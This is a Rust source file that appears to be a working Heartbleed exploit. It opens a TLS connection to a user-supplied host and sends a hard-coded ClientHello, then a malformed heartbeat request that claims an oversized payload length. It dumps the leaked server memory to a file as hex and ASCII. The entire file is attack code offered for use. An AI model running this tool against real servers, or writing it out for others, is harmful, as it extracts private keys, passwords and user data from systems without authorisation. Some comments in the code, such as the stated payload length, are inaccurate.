use std::{
    env,
    error::Error,
    fs::File,
    io::{Read, Write},
    net::TcpStream,
};

const EVIL_HEARTBEAT: [u8; 12] = [
    0x18, //content type, 0x18 means heartbeat
    0x03, 0x02, //tls version
    0x00, 0x07, //packet lenght, 3 + payload actual lenght
    0x01, //heartbeat message type, 0x01 means request
    0xff, 0xff, //payload lenght, set at 0x4000 (16K) even if the actual payload is 4 bytes
    0xde, 0xad, 0xbe, 0xef, //payload
];

//client hello message, needed for the tls handshake
const CLIENT_HELLO: [u8; 288] = [
    0x16, 0x03, 0x02, 0x01, 0x1b, 0x01, 0x00, 0x01, 0x17, 0x03, 0x02, 0xe2, 0xa2, 0xfe, 0x71, 0xf8,
    0x84, 0x57, 0x3f, 0x41, 0xbe, 0x75, 0xeb, 0x35, 0xf9, 0x10, 0xea, 0x2e, 0x39, 0x49, 0x10, 0x95,
    0xdd, 0x40, 0xd1, 0x15, 0x8b, 0x71, 0x4c, 0xc3, 0x22, 0x6d, 0x64, 0x20, 0x1a, 0x8f, 0x01, 0xa3,
    0xd5, 0x80, 0x25, 0x30, 0xd6, 0xa2, 0x7e, 0xb0, 0x0b, 0x3e, 0x80, 0xf9, 0x06, 0x77, 0xae, 0xe8,
    0x33, 0x88, 0x37, 0xe2, 0xb9, 0x4f, 0x02, 0x7c, 0x8a, 0x57, 0x2a, 0x1d, 0x00, 0x3e, 0x13, 0x02,
    0x13, 0x03, 0x13, 0x01, 0xc0, 0x2c, 0xc0, 0x30, 0x00, 0x9f, 0xcc, 0xa9, 0xcc, 0xa8, 0xcc, 0xaa,
    0xc0, 0x2b, 0xc0, 0x2f, 0x00, 0x9e, 0xc0, 0x24, 0xc0, 0x28, 0x00, 0x6b, 0xc0, 0x23, 0xc0, 0x27,
    0x00, 0x67, 0xc0, 0x0a, 0xc0, 0x14, 0x00, 0x39, 0xc0, 0x09, 0xc0, 0x13, 0x00, 0x33, 0x00, 0x9d,
    0x00, 0x9c, 0x00, 0x3d, 0x00, 0x3c, 0x00, 0x35, 0x00, 0x2f, 0x00, 0xff, 0x01, 0x00, 0x00, 0x90,
    0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a, 0x00, 0x0c, 0x00, 0x0a, 0x00, 0x1d,
    0x00, 0x17, 0x00, 0x1e, 0x00, 0x19, 0x00, 0x18, 0x00, 0x23, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00,
    0x00, 0x17, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x2a, 0x00, 0x28, 0x04, 0x03, 0x05, 0x03, 0x06, 0x03,
    0x08, 0x07, 0x08, 0x08, 0x08, 0x09, 0x08, 0x0a, 0x08, 0x0b, 0x08, 0x04, 0x08, 0x05, 0x08, 0x06,
    0x04, 0x01, 0x05, 0x01, 0x06, 0x01, 0x03, 0x03, 0x03, 0x01, 0x03, 0x02, 0x04, 0x02, 0x05, 0x02,
    0x06, 0x02, 0x00, 0x2b, 0x00, 0x05, 0x04, 0x03, 0x04, 0x03, 0x03, 0x00, 0x2d, 0x00, 0x02, 0x01,
    0x01, 0x00, 0x33, 0x00, 0x26, 0x00, 0x24, 0x00, 0x1d, 0x00, 0x20, 0x9a, 0x45, 0x90, 0x4c, 0x34,
    0x76, 0x48, 0x95, 0x3f, 0x34, 0x4c, 0x05, 0x2a, 0xd7, 0x31, 0x08, 0xba, 0x75, 0x44, 0x0c, 0xfb,
    0x34, 0xd3, 0x70, 0x85, 0x50, 0xea, 0xed, 0xfe, 0xbb, 0x6f, 0x70, 0x00, 0x0f, 0x00, 0x01, 0x01,
];

fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        println!("Usage: {} <host:port>", args[0]);
        return Err("Incorrect usage.".into());
    }

    //connect
    let mut tcp_stream = TcpStream::connect(&args[1])?;

    //send hello
    println!("Sending client hello...");
    tcp_stream.write_all(&CLIENT_HELLO)?;
    tcp_stream.flush()?;

    //check for handshake
    loop {
        //read header
        let mut header: [u8; 5] = [0; 5];
        tcp_stream.read_exact(&mut header)?;

        //get data lenght from header (bytes 3 and 4 of header together)
        let data_length = ((header[3] as u16) << 8) | header[4] as u16;

        //read data
        let mut data = vec![0; data_length as usize];
        tcp_stream.read_exact(&mut data)?;

        //if content type is 0x16 and data is 0xe then the handshake succeded
        if header[0] == 0x16 && data[0] == 0x0e {
            println!("Handshake success!");
            break;
        }

        //if content type is 0x00 then the handshake failed
        if header[0] == 0x00 {
            return Err("Handshake failed".into());
        }
    }

    //send evil heartbeat
    println!("Sending evil heartbeat...");
    tcp_stream.write_all(&EVIL_HEARTBEAT)?;
    tcp_stream.flush()?;

    let mut file = File::create("data.txt")?;

    //check for heartbeat response
    loop {
        //read header
        let mut header: [u8; 5] = [0; 5];
        tcp_stream.read_exact(&mut header)?;

        if header[0] == 0x18 {
            println!("Got heartbeat response!");

            //get data lenght from header (bytes 3 and 4 of header together)
            let data_length = ((header[3] as u16) << 8) | header[4] as u16;

            //check if data is bigger than it should
            if data_length > 7 {
                println!("Yoooo data length is bigger than it should! TARGET IS VULNERABLE!");
            }

            //read data
            let mut data = vec![0; data_length as usize];
            tcp_stream.read_exact(&mut data)?;

            //dump data to file
            println!("Dumping data to data.txt in hex format.");

            //dump in hex repr
            write!(file, "\n========= CONTENT OF RAM IN HEX =========\n");
            for d in &data {
                write!(file, "{:X}", *d)?;
            }

            //dump in ascii repr
            write!(file, "\n========= CONTENT OF RAM IN ASCII =========\n");
            for d in &data {
                write!(file, "{}", *d as char)?;
            }

        }
    }

    Ok(())
}
